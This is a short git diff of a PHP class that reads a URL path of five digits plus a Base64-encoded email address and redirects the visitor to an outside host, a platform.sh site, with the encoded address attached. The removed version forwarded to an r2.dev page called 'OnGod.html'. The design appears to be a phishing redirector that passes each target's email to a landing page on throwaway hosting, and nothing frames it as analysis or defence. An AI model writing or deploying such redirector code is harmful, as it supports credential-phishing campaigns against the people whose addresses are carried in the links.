@@ -10,14 +10,36 @@ class EmailDecoder
         return (base64_encode(base64_decode($data, true)) === $data);
     }
 
-    // Decode the email and redirect
-    public static function decode($email)
+    // Process the request
+    public static function process($path)
     {
-        if (self::isBase64($email)) {
-            $email = base64_decode($email);
-        }
+        // Extract the 5-digit number and Base64-encoded email from the path
+        preg_match('/^\/(\d{5})(.+)$/', $path, $matches);
 
-        header("Location: https://pub-52b565e2d63449c59c1957eb7cd05dc4.r2.dev/OnGod.html?email=" . $email);
-        exit;
+        if (count($matches) === 3) {
+            $randomNumber = $matches[1];
+            $encodedEmail = $matches[2];
+
+            // Decode the email if it is Base64 encoded
+            if (self::isBase64($encodedEmail)) {
+                $email = base64_decode($encodedEmail);
+
+                // Re-encode the email in Base64 to ensure it's clean
+                $encodedEmail = base64_encode($email);
+
+                // Construct the redirect URL
+                $url = "https://main-bvxea6i-vniscdoaqtby6.fr-4.platformsh.site/?{$encodedEmail}";
+
+                // Redirect to the constructed URL
+                header("Location: $url");
+                exit;
+            } else {
+                echo "Invalid Base64 encoded email.";
+                exit;
+            }
+        } else {
+            echo "Invalid URL format. Expected /{5randomdigits}{Base64EncodedEmail}.";
+            exit;
+        }
     }
 }
